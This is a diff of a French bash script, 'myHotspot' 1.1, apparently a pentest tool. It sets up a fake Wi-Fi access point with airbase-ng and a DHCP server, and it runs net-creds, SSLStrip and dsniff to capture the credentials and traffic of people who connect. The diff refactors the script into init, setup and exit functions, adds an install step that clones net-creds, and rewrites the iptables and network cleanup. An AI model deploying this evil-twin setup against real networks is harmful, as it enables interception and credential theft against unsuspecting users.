@@ -1,48 +1,47 @@
 #!/bin/bash
-# Copyright 2015 - Nyzo
-# myHotspot - version 1.0
+# Copyright (C) 2015 - Nyzo
+# myHotspot - version 1.1
 
-if [ "$1" == "kill" ];then
-echo
-echo "[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."
+#Initialisation paramètres console
+warn="\e[40;1;31m" #rouge
 
-pkill airbase-ng
-echo "[+] Airbase-ng (fake ap) stoppé"
-pkill dhcpd
-echo "[+] DHCP stoppé"
-killall python
-echo "[+] Net-Creds, SSLStrip et SSLStrip Log stoppés"
-pkill dsniff
-echo "[+] Dsniff stoppé"
-sleep 2
+init_fn() {
 
-echo "[+] Airmon-ng stoppé"
-sleep 2
-echo
-echo "0" > /proc/sys/net/ipv4/ip_forward
+#Nettoyage avant lancement du script
 iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-echo "[+] iptables restaurée"
-sleep 2
-airmon-ng stop mon0
-sleep 1
-echo
-ifconfig wlan0 up
-ifconfig wlan1 up
-ifconfig eth0 up
-# Ajouter-en d'autres si vous le souhaitez
-/etc/init.d/networking stop && /etc/init.d/networking start
-echo "[+] Redémarrage du système internet"
+iptables -t nat --flush
+iptables -t mangle --flush
+iptables -X
+iptables -t nat -X
+iptables -t mangle -X
 
-echo "[+] Nettoyage et restauration terminé !"
-echo "[+] Merci d'utiliser myHotspot et à bientôt !"
-sleep 4
-clear
-
-exit
-else
+#Vérification des installations
+#DHCP
+if [[ ! -x /usr/sbin/dhcpd ]];then
+  echo -e "$warn\nVous devez installer isc-dhcp-server"
+  sleep 1
+  echo -e "Voulez-vous le faire maintenant ? (y/n)"
+  read var
+  if [[ $var == y ]];then
+    apt-get install isc-dhcp-server
+  else
+    exit_fn
+  fi
+fi
+#Net-Creds
+if [[ ! -x /etc/net-creds ]];then
+  echo -e "$warn\nVous devez installer net-creds"
+  sleep 1
+  echo -e "Voulez-vous le faire maintenant ? (y/n)"
+  read var
+  if [[ $var == y ]];then
+    cd /etc
+    git clone https://github.com/DanMcInerney/net-creds.git
+    apt-get install python-scapy python
+  else
+    exit_fn
+  fi
+fi
 
 # Initialisation
 echo
@@ -62,6 +61,12 @@ read -e ESSID
 airmon-ng start $fakeap_interface
 fakeap=$fakeap_interface
 fakeap_interface="mon0"
+setup_fn
+}
+
+setup_fn() {
+
+trap exit_fn INT
 
 # Création de la configuration DHCPD
 mkdir -p "/pentest/wireless/myhotspot"
@@ -137,12 +142,17 @@ clear
 echo "[+] Initialistion terminée"
 echo
 echo "Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
-echo "IMPORTANT : Pressez Y pour quitter, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. Si vous n'avez pas quitter correctement, tapez ./myhotspot.sh kill"
-read STOP
+echo "IMPORTANT : Pour quitter, pressez q ou appuyez sur Ctrl+C, sinon vous pourriez obtenir des erreurs et des dysfonctionnements."
+read QUIT
+if [ $QUIT = "q" ] ; then
+exit_fn
+else
+read QUIT
+fi
+}
 
 # Nettoyage
-if [ $STOP = "y" ] ; then
-echo
+exit_fn() {
 echo "[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."
 
 kill ${fakeapid}
@@ -175,13 +185,14 @@ ifconfig $internet_interface up
 /etc/init.d/networking stop && /etc/init.d/networking start
 echo "[+] Redémarrage du système internet"
 
+echo -e "\e[0m"
+echo "[+] Redéfinition des paramètres de la console"
+
 echo "[+] Nettoyage et restauration terminé !"
 echo "[+] Merci d'utiliser myHotspot et à bientôt !"
-sleep 4
+sleep 3
 clear
-fi
 exit
+}
 
-fi
-
-exit
+init_fn
